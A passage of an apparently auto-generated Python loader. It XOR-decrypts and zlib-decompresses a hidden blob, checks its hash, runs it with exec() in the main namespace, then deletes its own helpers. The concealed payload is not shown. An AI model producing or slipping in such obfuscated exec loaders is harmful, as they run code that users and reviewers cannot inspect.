_cyB7SUkimcZ0xT + _cjqpsh4ws_NxUd + _cqLUabzHsDRV3d + _caGPsdAnk_wl8N + _cvCxYpYulALx8_ + _crUPyKUrQTwHM8 + _cfh_1eu9317kCb + _cqO9nWLjZ9nyO7 + _cme2dCIoerc2Ag + _chlG51ulnUwPi2 + _ckbcUXEx_c8FHx + _ci9yMSe0oLRmRs + _cbYr1gZxIDiuD8 + _cv4pPceA_rhyx6)
if __import__('hashlib').sha256(_pnAdNx6lRoMtYw).hexdigest() != 'fe1560cfe4432c8ad831f91d751f49ec1d1ad8c9b97ea71e315b99b756448b43':
    __import__('sys').exit(1)
_xcLa5wyzh4TMh_ = bytes([160, 206, 68, 232, 61, 212, 11, 101, 108, 2, 107, 43, 72, 39, 147, 12, 158, 129, 134, 1, 123, 143])
_fkmc5Huy26URpTO = bytes([25, 28, 70, 100, 38, 89, 195, 245, 188, 63, 250, 195, 81, 189, 127, 146, 37, 54, 125, 248, 214, 53])

def _fxsu0b9rNIFCJwT(_by1Yz6ZzcxNTzi, _kvN01K2DPzMh7B):
    return bytes(_by1Yz6ZzcxNTzi[_io9mIBOvMdqknE] ^ _kvN01K2DPzMh7B[_io9mIBOvMdqknE % len(_kvN01K2DPzMh7B)] for _io9mIBOvMdqknE in range(len(_by1Yz6ZzcxNTzi)))

def _fdb_bEV7wKgZFyX(_tqlNDPVERBskWK):
    import zlib
    return zlib.decompress(_tqlNDPVERBskWK) # Un seul niveau de zlib ici pour simplifier

def _fesl8GvIXPgwO8X():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfsbKJzsts2hot = _fxsu0b9rNIFCJwT(_pnAdNx6lRoMtYw, _xcLa5wyzh4TMh_)
    # 2. Décompression Zlib
    _du94Q6G7MvJnYv = _fdb_bEV7wKgZFyX(_xfsbKJzsts2hot)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _du94Q6G7MvJnYv.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nzFUZ3l46kxog8 = _main.__dict__
    _nzFUZ3l46kxog8.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nzFUZ3l46kxog8)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fesl8GvIXPgwO8X()
try:
    del _fxsu0b9rNIFCJwT, _fdb_bEV7wKgZFyX, _fesl8GvIXPgwO8X
    del _pnAdNx6lRoMtYw, _xcLa5wyzh4TMh_, _fkmc5Huy26URpTO
except:
    pass
